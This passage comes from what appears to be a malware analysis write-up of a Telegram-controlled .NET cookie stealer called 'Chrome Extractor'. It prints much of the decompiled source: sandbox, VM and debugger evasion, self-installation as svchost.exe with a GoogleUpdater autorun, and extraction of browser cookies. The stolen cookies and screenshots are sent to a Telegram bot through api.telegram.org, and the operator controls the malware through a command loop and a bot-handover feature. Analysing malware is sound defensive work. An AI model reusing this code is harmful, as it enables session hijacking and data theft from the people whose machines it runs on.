\u0026#34;DESKTOP-19OLLTD\u0026#34;, \u0026#34;DESKTOP-DE369SE\u0026#39;, \u0026#39;EA8C2E2A-D017-4\u0026#39;, \u0026#39;AIDANPC\u0026#39;, \u0026#39;LUCAS-PC\u0026#39;, \u0026#39;MARCI-PC\u0026#34;, \u0026#34;ACEPC\u0026#34;, \u0026#34;MIKE-PC\u0026#34;, \u0026#34;DESKTOP-IAPKN1P\u0026#34;, \u0026#34;DESKTOP-NTU7VUO\u0026#34;, \u0026#34;LOUISE-PC\u0026#34;, \u0026#34;T00917\u0026#34;, \u0026#34;test42\u0026#34; }; for (int i = 0; i \u0026lt; array.Length; i++) { if (array[i] == machineName) { return true; } } } catch (Exception) { } return false; } Checks if any of the dlls under {SbieDll.dll\u0026quot;, \u0026quot;SxIn.dll\u0026quot;, \u0026quot;Sf2.dll\u0026quot;, \u0026quot;snxhk.dll\u0026quot;, \u0026quot;cmdvrt32.dll\u0026quot; } is present in the machine\nChecks if the username of our user is present in the aforementioned array of generic usernames, and checks if the machine name is aforementioned machine names and if it is, then it returns true and exits having known that it is under a sandbox environment\nFUNC_inVirtualBox() # public static bool inVirtualBox() { using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u0026#34;Select * from Win32_ComputerSystem\u0026#34;)) { try { using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get(); foreach (ManagementBaseObject item in managementObjectCollection) { if ((item[\u0026#34;Manufacturer\u0026#34;].ToString().ToLower() == \u0026#34;microsoft corporation\u0026#34; \u0026amp;\u0026amp; item[\u0026#34;Model\u0026#34;].ToString().ToUpperInvariant().Contains(\u0026#34;VIRTUAL\u0026#34;)) || item[\u0026#34;Manufacturer\u0026#34;].ToString().ToLower().Contains(\u0026#34;vmware\u0026#34;) || item[\u0026#34;Model\u0026#34;].ToString() == \u0026#34;VirtualBox\u0026#34;) { return true; } } } catch { return true; } } foreach (ManagementBaseObject item2 in new ManagementObjectSearcher(\u0026#34;root\\\\CIMV2\u0026#34;, \u0026#34;SELECT * FROM Win32_VideoController\u0026#34;).Get()) { if (item2.GetPropertyValue(\u0026#34;Name\u0026#34;).ToString().Contains(\u0026#34;VMware\u0026#34;) \u0026amp;\u0026amp; item2.GetPropertyValue(\u0026#34;Name\u0026#34;).ToString().Contains(\u0026#34;VBox\u0026#34;)) { return true; } } Checks if the manufacturer is microsoft corporation and if the model copntains \u0026ldquo;Virtual\u0026rdquo; or checks if the manufacturer is vmware or virtualbox\nThen checks if the VideoController Object\u0026rsquo;s Name value is VMWare or VBox\nFUNC_inDebugger() # Thread.Sleep(10) is expected to cause approximately a 10ms delay.\nIf the actual elapsed time is significantly less than 10ms, it implies the thread was artificially resumed early or time was manipulated, often a sign of debugger interference.\nNow going back to our main code, now we go into the persistence.installSelf()\nWhich checks if the directory exists, if not creates then copies our file into the said directory under the name of svchost.exe\nThen we go into\nFUNC_persistence.MeltFile() # Firstly it checks if the current path of the process is the same as the config.InstallPath, inwhich case it returns without MeltFile\nIn our case it is not the same so it goes onto create and run a bat file with the code\n@echo off\rchcp 65001 \u0026gt; nul\\n\r:l\rTasklist /fi \\\u0026#34;PID eq \u0026#34; + \u0026lt;current process id\u0026gt; + \u0026#34;\\\u0026#34; | find \\\u0026#34;:\\\u0026#34;\rif Errorlevel 1 (\rTimeout /T 1 /Nobreak\rGoto l\r)\rDel \\\u0026#34; \u0026lt;Current_Malware_File\u0026gt;\\\u0026#34;\rCd \\\u0026#34;\u0026#34; + config.InstallPath + \u0026#34;\\\u0026#34;\rTimeout /T 1 /Nobreak\rStart \\\u0026#34;\\\u0026#34; \\\u0026#34;\u0026#34; + \u0026lt;config.InstallPath\u0026gt; + \u0026#34;\\\\\u0026#34; + \u0026lt;config.InstallExeName\u0026gt; + \u0026#34;\\\u0026#34; Basically, checks if our current process has finished executing and if it has, then deletes the associated image file\nThen launches our new svchost process under the InstallPath Then it creates a new process to delete the .bat file itself Then it goes on to terminate the current running process\nFUNC_utils.IsConnectedToInternet() # Then now it checks if it has an internet connection by pinging to google and to telegram\nNow we had already seen telegram as part of strings and variable names, so this strengthens the idea that the malware is part of a bot c2 setup over telegram\nThen it sets up AutoRun under the Current User under the name of config.AutoRunName=GoogleUpdater and sets it to our svchost.exe\nBasically everytime the user logs in, the svchost runs\nFUNC_persistence.processChecker() # Though for the current process the BlockNetworkActivityWhenProcessStarted is set to 0, I assume inside the svchost it would be set to 1\nand if it sees any of these processes {\u0026ldquo;processhacker\u0026rdquo;, \u0026ldquo;netstat\u0026rdquo;, \u0026ldquo;netmon\u0026rdquo;, \u0026ldquo;tcpview\u0026rdquo;, \u0026ldquo;wireshark\u0026rdquo;, \u0026ldquo;filemon\u0026rdquo;, \u0026ldquo;regmon\u0026rdquo;, \u0026ldquo;cain\u0026rdquo; }; running it would report via telegram that a suspicious process was found\nnext code block\n{ string name = \u0026#34;Software\\\\\u0026#34; + config.RegistryKey; using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: false); string text10 = registryKey?.GetValue(\u0026#34;Tval\u0026#34;) as string; if (!string.IsNullOrWhiteSpace(text10)) { config.TelegramToken = text10; } string text11 = registryKey?.GetValue(\u0026#34;Cval\u0026#34;) as string; if (!string.IsNullOrWhiteSpace(text11)) { config.TelegramChatID = text11; } } Now it checks inside the registry Software\\GoogleUpdate if we have Tval and Cval if we do and it\u0026rsquo;s not nul or whitespace then it is assigned to TelegramToken and TelegramChatId respectively\nMoving on,\nFUNC_telegram.sendConnection() # public static void sendConnection() { telegram.Identifier = new Random().Next(1, 10000); telegram.sendText(string.Concat(new string[] { \u0026#34;\\ud83c\\udf00Chrome Extractor: PC connected:\\nUsername: \u0026#34;, Environment.UserName.ToString(), \u0026#34;, Location: \u0026#34;, telegram.Location, \u0026#34;, ID: \u0026#34;, telegram.Identifier.ToString(), \u0026#34;\\nℹ\\ufe0fSend \\\u0026#34;/\u0026#34;, telegram.Identifier.ToString(), \u0026#34;*help\\\u0026#34; to see the command list\u0026#34; })); Creates a random identifier for our machine then sends out the text Chrome Extractor : PC connected: Username: username, Location: telegram-location, ID: random, ☺️Send *help\\ to see the command list\nRegistry GoogleUpdate - ValueX # string text12 = \u0026#34;\u0026#34;; try { string name2 = \u0026#34;Software\\\\\u0026#34; + config.RegistryKey; using RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name2, writable: false); string text13 = registryKey2?.GetValue(\u0026#34;Value X\u0026#34;) as string; if (!string.IsNullOrWhiteSpace(text13)) { text12 += text13; } } catch (Exception) {} This just opens the registry key HKEY_CURRENT_USER\\SOFTWARE\\GoogleUpdate and checks if the Value X has been set, if it is then it appends it as a string to text12\nBut in our case it doesn\u0026rsquo;t exist so it goes to the next if condition\nif (text12 == \u0026#34;\u0026#34;) { string text14 = \u0026#34;\u0026#34;; string[] array2 = config.startupURLs; foreach (string text15 in array2) { text14 = text14 + text15 + \u0026#34; \u0026#34;; } try { if (config.StartupKill) { foreach (Process item in Process.GetProcessesByName(\u0026#34;chrome\u0026#34;).ToList()) { try { if (item.MainModule.FileName != config.InstallPath + \u0026#34;\\\\\u0026#34; + config.InstallExeName) { item.Kill(); item.WaitForExit(); } } catch (Exception) { } } } if (Process.GetProcessesByName(\u0026#34;chrome\u0026#34;).Length == 0) { string chromePath = CookieExtractor.GetChromePath(); if (chromePath != \u0026#34;\u0026#34; \u0026amp;\u0026amp; Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0026#34;\\\\Google\\\\Chrome\\\\User Data\\\\Default\u0026#34;)) { string result = CookieExtractor.GetCookies(config.startupURLs, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0026#34;\\\\Google\\\\Chrome\\\\User Data\u0026#34;, chromePath, \u0026#34;Default\u0026#34;, \u0026#34;chrome\u0026#34;, force: false).Result; if (!result.StartsWith(\u0026#34;\u0026lt;Error\u0026#34;) \u0026amp;\u0026amp; result != \u0026#34;\u0026#34;) { telegram.sendStringAsFile(result, \u0026#34;\\ud83e\\udd60Cookies from these websites [\u0026#34; + text14 + \u0026#34;] were successfully grabbed from the Default profile of Chrome\u0026#34;); } } } } This block starts with gettin gthe startupURLs array which is {google.com, youtube.com} and takes each string in that and adds them together as a single string\nNow our config.StartupKill is 0, but had it been set, we see that the malware focibly tires to kills hte running process but because it\u0026rsquo;s not enabled, it goes to the next piece of code if (Process.GetProcessesByName(\u0026quot;chrome\u0026quot;).Length == 0)\rThis basically checks that there are currently no running processes in the system\nThen it does the following\nFUNC_Get Chrome Path this basically checks some precoded places and the PATH variable\nExtract cookies of google.com and youtube.com from chrome\u0026rsquo;s user data folder Checks if they don\u0026rsquo;t return an error or null, iin which case it sends string as file FUNC_telegram.SendStringAsFile() # public static void sendStringAsFile(string content, string caption, string fileName = \u0026#34;cookies.txt\u0026#34;, string type = \u0026#34;Document\u0026#34;) { try { if (string.IsNullOrEmpty(content)) { sendText(\u0026#34;\\ud83d\\uded1Error occurred, the content seems to be empty.\u0026#34;); return; } using HttpClient httpClient = new HttpClient(); MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent(); byte[] bytes = Encoding.UTF8.GetBytes(content); multipartFormDataContent.Add(new ByteArrayContent(bytes), type.ToLower(), fileName); HttpResponseMessage result = httpClient.PostAsync(\u0026#34;https://api.telegram.org/bot\u0026#34; + config.TelegramToken + \u0026#34;/send\u0026#34; + type + \u0026#34;?chat_id=\u0026#34; + config.TelegramChatID + \u0026#34;\u0026amp;caption=\u0026#34; + Uri.EscapeDataString(caption), multipartFormDataContent).Result; if (!result.IsSuccessStatusCode) { sendText(\u0026#34;\\ud83d\\uded1Error occurred while sending the file. Response: \u0026#34; + result.ReasonPhrase); } } catch (Exception ex) { sendText(\u0026#34;\\ud83d\\uded1Error occurred: \u0026#34; + ex.Message); } } It takes the cookies, copies it as bytes into cookies.txt and then sends the entire thing as a file over to telegram\nThen we see it does the same for the following browsers\nmsedge brave yandex browser opera opera gx Next code block\ntry { Random random = new Random(); try { RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey(\u0026#34;Software\\\\\u0026#34; + config.RegistryKey); registryKey3.SetValue(\u0026#34;Value X\u0026#34;, random.Next(1, 10000).ToString()); registryKey3.Close(); } catch (Exception) { RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey(\u0026#34;Software\\\\\u0026#34; + config.RegistryKey); registryKey4.SetValue(\u0026#34;Value X\u0026#34;, random.Next(1, 10000).ToString()); registryKey4.Close(); } As we can see now it is trying to set the Value X to some randomg Value , this is set as an indication to let the malware know that the next time it runs, it doesn\u0026rsquo;t have to scour through to get the cookies but it already has got and sent it over to telegram once\nThen finally that brings us to this in Main telegram.waitCommandsThread.Start();: This is basically a wrapper function to start a thread for the function below\nFUNC_Waitcommands() # // ChromeExtractor.telegram using System; using System.Net; using System.Threading; using SimpleJSON; private static void waitCommands() { int num = 0; string text; try { using (WebClient webClient = new WebClient()) { text = webClient.DownloadString(\u0026#34;https://api.telegram.org/bot\u0026#34; + config.TelegramToken + \u0026#34;/getUpdates?offset=-1\u0026#34;); } num = JSON.Parse(text)[\u0026#34;result\u0026#34;][0][\u0026#34;message\u0026#34;][\u0026#34;date\u0026#34;].AsInt; } catch (Exception) { } while (true) { try { Thread.Sleep(config.TelegramCommandCheckDelay * 1000); waitForUnblock(); using (WebClient webClient2 = new WebClient()) { text = webClient2.DownloadString(\u0026#34;https://api.telegram.org/bot\u0026#34; + config.TelegramToken + \u0026#34;/getUpdates?offset=-1\u0026#34;); } try { if (JSON.Parse(text)[\u0026#34;result\u0026#34;][0][\u0026#34;message\u0026#34;][\u0026#34;date\u0026#34;].AsInt \u0026lt;= num) { continue; } JSONNode.Enumerator enumerator = JSON.Parse(text)[\u0026#34;result\u0026#34;].AsArray.GetEnumerator(); while (enumerator.MoveNext()) { JSONNode jSONNode = ((JSONNode)enumerator.Current)[\u0026#34;message\u0026#34;]; if ((string)jSONNode[\u0026#34;chat\u0026#34;][\u0026#34;id\u0026#34;] != config.TelegramChatID) { break; } if (!jSONNode.HasKey(\u0026#34;text\u0026#34;)) { continue; } try { string text2 = jSONNode[\u0026#34;text\u0026#34;]; if (text2.StartsWith(\u0026#34;/\u0026#34;)) { string text3 = text2.Remove(0, 1); if (text3.Split(\u0026#39;*\u0026#39;)[0] == Identifier.ToString() || text3.Split(\u0026#39;*\u0026#39;)[0].ToLower() == \u0026#34;all\u0026#34; || text3.ToLower() == \u0026#34;online\u0026#34;) { commands.handle(text3); } } } catch (Exception) { } } num = JSON.Parse(text)[\u0026#34;result\u0026#34;][0][\u0026#34;message\u0026#34;][\u0026#34;date\u0026#34;].AsInt; } catch (Exception) { try { if (text.Contains(\u0026#34;webhook\u0026#34;)) { using WebClient webClient3 = new WebClient(); webClient3.DownloadString(\u0026#34;https://api.telegram.org/bot\u0026#34; + config.TelegramToken + \u0026#34;/deleteWebhook\u0026#34;); } } catch (Exception) { } } } catch (Exception) { } } } For this from simple googling we get https://core.telegram.org/bots/api#getupdates Which tells us how the api of getupdates works and that it returns in a json format. THe offset -1 tells it to get the latest update\nGets Latest Update Parses the timestamp (date) of the most recent message and stores it in num If the latest update has a date field less than or equal to the last processed timestamp (num), it continues without processing (no new messages) Otherwise, iterates through all the updates in the result array For each message it checks if it is from the configured allowed chat ID Checks if the message contains text If the text starts with a / (indicating a command), it removes the / and splits it by * Processes the command if its first part matches the current bot Identifier which we had randomly generated earlier or \u0026ldquo;all\u0026rdquo; or \u0026ldquo;online\u0026rdquo; Executes the command handler commands.handle(text3) with the command string Then it updates num to the latest timestamp to keep it ready for the next upcoming commands Which brings us to possibly the most important function of them all now which is\nFUNC_commands.handle() # online\nThis part takes the command that it receives from the bot and checks if the command is \u0026ldquo;online\u0026rdquo; and if it is, then the malware sends the text back to bot with the followin information\nusername ID Location gift\nstring[] array = command.Split(\u0026#39;*\u0026#39;); if (array.Length \u0026lt;= 1) { return; } string text = array[1].ToLower(); if (text != null) { switch (text.Length) { case 4: switch (text[0]) { case \u0026#39;g\u0026#39;: { if (!(text == \u0026#34;gift\u0026#34;)) { break; } string text5; string text6; string text7; try { text5 = array[2]; text6 = array[3]; text7 = array[4]; } catch (IndexOutOfRangeException) { telegram.sendText(\u0026#34;\\ud83d\\uded1Incorrect amount of arguments!\u0026#34;); return; } try { string text8; using (WebClient webClient = new WebClient()) { text8 = webClient.DownloadString(\u0026#34;https://api.telegram.org/bot\u0026#34; + text5 + \u0026#34;/sendMessage?chat_id=\u0026#34; + text6 + \u0026#34;\u0026amp;text=⚙\\ufe0f[Chrome Cookie Extractor] Gifting a bot to you...\u0026#34;); } if (text8.Contains(\u0026#34;\\\u0026#34;ok\\\u0026#34;:false\u0026#34;)) { telegram.sendText(\u0026#34;⚠\\ufe0fThe token/chat ID isn`t correct or the bot isn`t started by user. Please check the credentials and try again\u0026#34;); return; } } catch (Exception ex16) { telegram.sendText(\u0026#34;⚠\\ufe0fFailed to check the bot token. The gifting won`t be done for not losing the remote access forever. Error text: \u0026#34; + ex16.Message.ToString()); return; } try { try { RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(\u0026#34;Software\\\\\u0026#34; + config.RegistryKey); registryKey.SetValue(\u0026#34;Tval\u0026#34;, text5); registryKey.SetValue(\u0026#34;Cval\u0026#34;, text6); registryKey.Close(); } catch (Exception) { RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(\u0026#34;Software\\\\\u0026#34; + config.RegistryKey); registryKey2.SetValue(\u0026#34;Tval\u0026#34;, text5); registryKey2.SetValue(\u0026#34;Cval\u0026#34;, text6); registryKey2.Close(); } telegram.sendText(\u0026#34;\\ud83c\\udf81You`ve gifted a bot:\\nUsername: \u0026#34; + Environment.UserName.ToString() + \u0026#34;, ID: \u0026#34; + telegram.Identifier + \u0026#34;, Location: \u0026#34; + telegram.Location.ToString()); config.TelegramToken = text5; config.TelegramChatID = text6; telegram.sendText(\u0026#34;\\ud83c\\udf81You were gifted a bot:\\nUsername: \u0026#34; + Environment.UserName.ToString() + \u0026#34;, ID: \u0026#34; + telegram.Identifier + \u0026#34;, Location: \u0026#34; + telegram.Location.ToString() + \u0026#34;\\nℹ\\ufe0fFor the command list send /\u0026#34; + telegram.Identifier + \u0026#34;*help\\n\\ud83d\\udcdcPrevious owner message: \u0026#34; + text7); return; } catch (Exception ex18) { telegram.sendText(\u0026#34;\\ud83d\\udce1Error: \u0026#34; + ex18.Message.ToString()); return; } } Seems like the commands are send of the format \\*command* So now the malware gets the commands and already has removed the \\ and now it splits according to *, and takes the length of the command\nIf length is 4, and the first letter is g, it checks if the command it received is gift\nIn which case, it expects that there be 3 arguments in the form of\n\\*command*arg1*arg2*arg3\narg1 - New telegram Bot token arg2 - New Chat ID arg3 - Previous ownder message\nThen\nIt tries to send a test message using the new bot token/chat ID by calling telegram.sendMessage API\nIf it receives an error (\u0026ldquo;ok\u0026rdquo;:false), it notifies the sender that the token or chat ID is incorrect\nAnd now it updates this new token val and chat id val into registry accordingly Under the registry key HKEY_CURRENT_USER\\SOFTWARE\\GoogleUpdate and the values Tval and Cval are set accordingly to Token value and chatID value\nThen the config.TelegramToken is updated and the config.TelegramChatID is updated as ɑ\nhelp\ncase \u0026#39;h\u0026#39;: if (!(text == \u0026#34;help\u0026#34;)) { break; } telegram.sendText(\u0026#34;\\ud83d\\udcdcCommand list:\\n\\ud83d\\udd39/online - See all your bots\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*help - help\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*cookies*\u0026lt;urls, separated with spaces\u0026gt;*\u0026lt;browser name\u0026gt;*\u0026lt;profile name (not a necessary argument)\u0026gt; - get cookies\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*cookiesforce*\u0026lt;urls, separated with spaces\u0026gt;*\u0026lt;browser name\u0026gt;*\u0026lt;profile name (not a necessary argument)\u0026gt; - get cookies killing the browser if it`s already running\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*kill*\u0026lt;browser name\u0026gt; - kill the current browser session\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*getprofiles - get the list of Chromium browsers and their profiles\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*desktop - grab a screenshot\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*whois - get user location\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*uninstall - uninstall the software from this device\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*startuplist - see the list of startup programs\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*startupadd - add the software to startup\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*gift*\u0026lt;NEW TOKEN\u0026gt;*\u0026lt;NEW CHAT ID\u0026gt;*\u0026lt;message\u0026gt; - gift this bot to another user, his telegram bot has to be started\\n\\ud83d\\udd39/\u0026#34; + telegram.Identifier + \u0026#34;*about - about\u0026#34;); return; THis one is pretty self explanatory, it shows a help menu of the bot, which list out all the possible commands and how to use them\nCommands : # /online - See all your bots *help - help *cookies*\u0026lt;urls, separated with spaces\u0026gt;*\u0026lt;browser name\u0026gt;*\u0026lt;profile name (not a necessary argument)\u0026gt; - get cookies *cookiesforce*\u0026lt;urls, separated with spaces\u0026gt;*\u0026lt;browser name\u0026gt;*\u0026lt;profile name (not a necessary argument)\u0026gt; - get cookies killing the browser if it`s already running *kill*\u0026lt;browser name\u0026gt; - kill the current browser session *getprofiles - get the list of Chromium browsers and their profiles *desktop - grab a screenshot *whois - get user location *uninstall - uninstall the software from this device *startuplist - see the list of startup programs *startupadd - add the software to startup *gift*\u0026lt;NEW TOKEN\u0026gt;*\u0026lt;NEW CHAT ID\u0026gt;*\u0026lt;message\u0026gt; - gift this bot to another user, his telegram bot has to be started *about - about\nkill # case \u0026#39;k\u0026#39;: if (!(text == \u0026#34;kill\u0026#34;)) { break; } try { Dictionary\u0026lt;string, string\u0026gt; dictionary = new Dictionary\u0026lt;string, string\u0026gt;(); dictionary.Add(\u0026#34;chrome\u0026#34;, \u0026#34;chrome\u0026#34;); dictionary.Add(\u0026#34;edge\u0026#34;, \u0026#34;msedge\u0026#34;); dictionary.Add(\u0026#34;yandex\u0026#34;, \u0026#34;browser\u0026#34;); dictionary.Add(\u0026#34;brave\u0026#34;, \u0026#34;brave\u0026#34;); dictionary.Add(\u0026#34;opera\u0026#34;, \u0026#34;opera\u0026#34;); dictionary.Add(\u0026#34;operagx\u0026#34;, \u0026#34;opera\u0026#34;); string text4 = \u0026#34;\u0026#34;; try { text4 = array[2].ToLower(); } catch (IndexOutOfRangeException) { telegram.sendText(\u0026#34;\\ud83d\\uded1Incorrect amount of arguments!\u0026#34;); return; } if (!dictionary.ContainsKey(text4)) { telegram.sendText(\u0026#34;\\ud83d\\uded1Unknown browser!\u0026#34;); return; } int num = 0; foreach (Process item in Process.GetProcessesByName(dictionary[text4]).ToList()) { num++; try { if (item.MainModule.FileName != config.InstallPath + \u0026#34;\\\\\u0026#34; + config.InstallExeName) { item.Kill(); } } catch (Exception) { } } if (num \u0026gt; 0) { telegram.sendText(\u0026#34;✅All the processes were killed\u0026#34;); } else { telegram.sendText(\u0026#34;⚠\\ufe0fNo running instances of this browser were found\u0026#34;); } return; } This command is used to kill all the running processes of a particular browser name as specified by the argument\nabout # case \u0026#39;a\u0026#39;: if (!(text == \u0026#34;about\u0026#34;)) { break; } telegram.sendText(\u0026#34;\\ud83c\\udf00Chrome Extractor, version: \u0026#34; + telegram.softVersion.ToString() + \u0026#34;\\nThis is an utility to extract cookies remotely from the Google Chrome browser, including the latest versions\\n\\ud83d\\udc51Coded by @shinyenigma\u0026#34;); return; This shows the about information of this malware Chrome Extractor, version: \u0026lt;telegram version\u0026gt; This is an utility to extract cookies remotely from the Google Chrome browser, including the latest versions\\n\\ud83d\\udc51Coded by @shinyenigma\nwhois # Gets us the IP | country| country code|CIty| Region|Internet Provider\ndesktop # This takes a screenshot of whatever is on screen at the moment\npublic static void desktopScreenshot() { string fileName = \u0026#34;screenshot.jpg\u0026#34;; using MemoryStream memoryStream = new MemoryStream(); using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero)) { IntPtr hdc = graphics.GetHdc(); int deviceCaps = Win32Native.GetDeviceCaps(hdc, 118); int deviceCaps2 = Win32Native.GetDeviceCaps(hdc, 117); graphics.ReleaseHdc(hdc); int height = deviceCaps2; using Bitmap bitmap = new Bitmap(deviceCaps, height); using (Graphics graphics2 = Graphics.FromImage(bitmap)) { graphics2.CopyFromScreen(0, 0, 0, 0, bitmap.Size); } bitmap.Save(memoryStream, ImageFormat.Jpeg); } using HttpClient httpClient = new HttpClient(); MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent(); byte[] array = memoryStream.ToArray(); multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), \u0026#34;Document\u0026#34;.ToLower(), fileName); httpClient.PostAsync(\u0026#34;https://api.telegram.org/bot\u0026#34; + config.TelegramToken + \u0026#34;/sendDocument?chat_id=\u0026#34; + config.TelegramChatID + \u0026#34;\u0026amp;caption=\\ud83d\\udcf8Screenshot was successfully taken\u0026#34;, multipartFormDataContent).Wait(); httpClient.Dispose(); It sends it over as a document as \u0026ldquo;screenshot.jpg\u0026rdquo;\ncookies: # Syntax : *cookies*\u0026lt;urls, separated with spaces\u0026gt;*\u0026lt;browser name\u0026gt;*\u0026lt;profile name (not a necessary argument)\u0026gt;\nif (!(text == \u0026#34;cookies\u0026#34;)) { break; } string text11 = \u0026#34;Default\u0026#34;; string text12 = \u0026#34;Chrome\u0026#34;; string[] array3; try { array3 = array[2].Split(\u0026#39; \u0026#39;); } catch (IndexOutOfRangeException) { telegram.sendText(\u0026#34;\\ud83d\\uded1Incorrect amount of arguments!\u0026#34;); return; } try { text12 = array[3]; } catch (IndexOutOfRangeException) { telegram.sendText(\u0026#34;\\ud83d\\uded1Incorrect amount of arguments!\u0026#34;); return; } if (array3.Length == 0) { telegram.sendText(\u0026#34;\\ud83d\\uded1No valid URLs provided\u0026#34;); return; } if (array.Length \u0026gt; 4) { try { text11 = array[4]; } catch (Exception) { } } Checks if the browser we want to extract cookies out of is running, if it is then it requests us to kill it first.\nBy default text 11 and text12 is set to Default and Chrome But, text 12 - what browser the bot operator wants to get cookies out of text 11 - specific user profile array3 - the urls of the websites from which the malware steals cookies\nSimilarly for other browsers it\u0026rsquo;s the same format to retrieve the cookies just that the if conditions change to respective browser names etc.\nstartuplist # if (!(text == \u0026#34;startuplist\u0026#34;)) { break; } try { string text9 = \u0026#34;\\ud83d\\udd18Current startup list:\u0026#34;; try { text9 += \u0026#34;\\n⚙\\ufe0fRegistry:\u0026#34;; string name = \u0026#34;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\u0026#34;; using RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(name, writable: false); string[] valueNames = registryKey3.GetValueNames(); foreach (string name2 in valueNames) { text9 = text9 + \u0026#34;\\n\u0026#34; + registryKey3.GetValue(name2).ToString(); } } catch (Exception) { } try { text9 += \u0026#34;\\n\\ud83d\\udcc2Startup folder:\u0026#34;; string[] valueNames = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0026#34;\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\u0026#34;); foreach (string text10 in valueNames) { text9 = text9 + \u0026#34;\\n\u0026#34; + text10; } } catch (Exception) { } telegram.sendText(text9); return; } catch (Exception ex22) { telegram.sendText(\u0026#34;\\ud83d\\udce1Error: \u0026#34; + ex22.Message.ToString()); return; } To find the current startup list it does two things\nqueries registry HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run Then gets all the value names from the registry\nStartup Folder - \\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\nIt gets all the files from the above directory and concatenates it into a single string and sends it over telegram\ngetprofiles # case \u0026#39;g\u0026#39;: if (!(text == \u0026#34;getprofiles\u0026#34;)) { break; } try { telegram.sendText(string.Concat(string.Concat(string.Concat(string.Concat(\u0026#34;\\ud83c\\udf10Browsers and profiles:\u0026#34; + GetProfiles(\u0026#34;Chrome\u0026#34;, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0026#34;\\\\Google\\\\Chrome\\\\User Data\u0026#34;), GetProfiles(\u0026#34;Edge\u0026#34;, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0026#34;\\\\Microsoft\\\\Edge\\\\User Data\u0026#34;)), GetProfiles(\u0026#34;Brave\u0026#34;, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0026#34;\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\u0026#34;)), GetProfiles(\u0026#34;Yandex\u0026#34;, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0026#34;\\\\Yandex\\\\YandexBrowser\\\\User Data\u0026#34;)), GetProfiles(\u0026#34;Opera\u0026#34;, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0026#34;\\\\Opera Software\\\\Opera Stable\u0026#34;))); return; } catch (Exception ex19) { telegram.sendText(\u0026#34;\\ud83d\\udce1Error: \u0026#34; + ex19.Message.ToString()); return; } } break; Pretty self explanatory - Gets all the profiles from all the browsers. Accesses the Default path where you can find the Profile folders and just takes the names of each of those profiles and appends it with the browser name and returns it which is then sent over telegram\nuninstall # This is the KILL Switch of the malware It performs\npersistence.uninstallself sleep 2 seconds then exits FUNC_persisten.uninstallself() # // ChromeExtractor.persistence using System; using System.Diagnostics; using System.IO; using System.Reflection; public static void uninstallSelf() { try { delAutorun(); } catch (Exception) { } try { if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0026#34;\\\\temporal\u0026#34;)) { Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0026#34;\\\\temporal\u0026#34;, recursive: true); } } catch (Exception) { } try { Process process = new Process(); process.StartInfo = new ProcessStartInfo { WindowStyle = ProcessWindowStyle.Hidden, FileName = \u0026#34;cmd.exe\u0026#34;, Arguments = \u0026#34;/c reg delete HKCU\\\\Software\\\\\u0026#34; + config.RegistryKey + \u0026#34; /f\u0026#34; }; process.Start(); } catch (Exception) { } string text = Path.GetTempFileName() + \u0026#34;.bat\u0026#34;; Process.GetCurrentProcess().Id.ToString(); if (!config.NoInstall) { using StreamWriter streamWriter = File.AppendText(text); streamWriter.WriteLine(\u0026#34;@echo off\u0026#34;); streamWriter.WriteLine(\u0026#34;chcp 65001 \u0026gt; nul\\n\u0026#34;); streamWriter.WriteLine(\u0026#34;:l\u0026#34;); streamWriter.WriteLine(\u0026#34;if Errorlevel 1 (\u0026#34;); streamWriter.WriteLine(\u0026#34; Timeout /T 1 /Nobreak\u0026#34;); streamWriter.WriteLine(\u0026#34; Goto l\u0026#34;); streamWriter.WriteLine(\u0026#34;)\u0026#34;); streamWriter.WriteLine(\u0026#34;Rmdir /S /Q \\\u0026#34;\u0026#34; + config.InstallPath + \u0026#34;\\\u0026#34;\u0026#34;); } else { using StreamWriter streamWriter2 = File.AppendText(text); streamWriter2.WriteLine(\u0026#34;@echo off\u0026#34;); streamWriter2.WriteLine(\u0026#34;chcp 65001 \u0026gt; nul\\n\u0026#34;); streamWriter2.WriteLine(\u0026#34;:l\u0026#34;); streamWriter2.WriteLine(\u0026#34;if Errorlevel 1 (\u0026#34;); streamWriter2.WriteLine(\u0026#34; Timeout /T 1 